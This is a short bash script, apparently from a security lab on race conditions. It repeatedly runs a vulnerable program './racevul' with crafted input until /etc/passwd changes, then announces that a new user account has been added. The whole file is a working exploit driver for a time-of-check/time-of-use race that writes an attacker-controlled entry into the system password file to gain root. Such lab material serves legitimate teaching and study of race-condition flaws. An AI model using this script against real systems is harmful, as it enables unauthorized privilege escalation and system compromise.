#!/bin/bash
#vulnerable_process.sh

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
   ./racevul < passwd_input
   new=$($CHECK_FILE)
done
echo "STOP... The new user account has been added to passwd file"